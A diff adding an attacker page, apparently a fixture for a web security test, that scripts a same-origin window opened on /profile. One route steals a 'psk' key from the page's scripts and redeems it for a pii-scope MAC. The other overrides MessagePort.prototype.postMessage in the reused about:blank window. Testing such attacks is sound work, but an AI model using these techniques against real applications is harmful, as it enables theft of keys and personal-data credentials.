@@ -1,0 +1,53 @@
+<script>
+  // Opens the profile page in a new tab and attacks it before its key is redeemed,
+  // by route. Both pages are same-origin with the same COOP, so this page can
+  // script the new one.
+  const route = {{route}};
+  const report = (event) => fetch(location.origin + "/log?attacker-" + event);
+  const stole = (data) => report("stole-" + encodeURIComponent(JSON.stringify(data)));
+  if (window.opener) {
+    // The opened page reports whether the opener's changes to its initial
+    // about:blank document's window are still there.
+    report("opened-reused-window-" + Boolean(window.attackerMark));
+  } else if (navigator.serviceWorker.controller) {
+    const w = open("/profile");
+    if (route === "read-key") {
+      // Reads the key from the opened page's scripts and redeems it for the
+      // controller frame's MAC, then gets the pii scope's MAC with it.
+      const start = Date.now();
+      const poll = () => {
+        let key;
+        try {
+          key = [...w.document.scripts].map((s) => s.textContent + s.src).join("\n").match(/psk[=/]([\w-]{43})/)?.[1];
+        } catch {}
+        if (!key) {
+          if (Date.now() - start < 5000) setTimeout(poll);
+          else report("opener-key-not-found");
+          return;
+        }
+        report("opener-found-key");
+        fetch("/psk/" + key).then(async (r) => {
+          report("opener-redeem-" + r.status);
+          if (!r.ok) return;
+          const mac = await fetch("/scope-mac/pii", { headers: { "Trusted-Scope-Signature": await r.text() } });
+          stole({ status: mac.status, mac: await mac.text() });
+        });
+      };
+      poll();
+    }
+    if (route === "pollute") {
+      // Replaces MessagePort.prototype.postMessage in the initial about:blank
+      // document's window. If the opened page reuses that window, its head script
+      // saves the replacement, which asks any port it sends on for the pii scope's
+      // MAC on a channel of its own.
+      w.attackerMark = true;
+      const original = w.MessagePort.prototype.postMessage;
+      w.MessagePort.prototype.postMessage = function (message, transfer) {
+        const mint = new w.MessageChannel();
+        mint.port1.onmessage = (m) => stole(m.data);
+        original.call(this, { scope: "pii" }, [mint.port2]);
+        return original.call(this, message, transfer);
+      };
+    }
+  }
+</script>
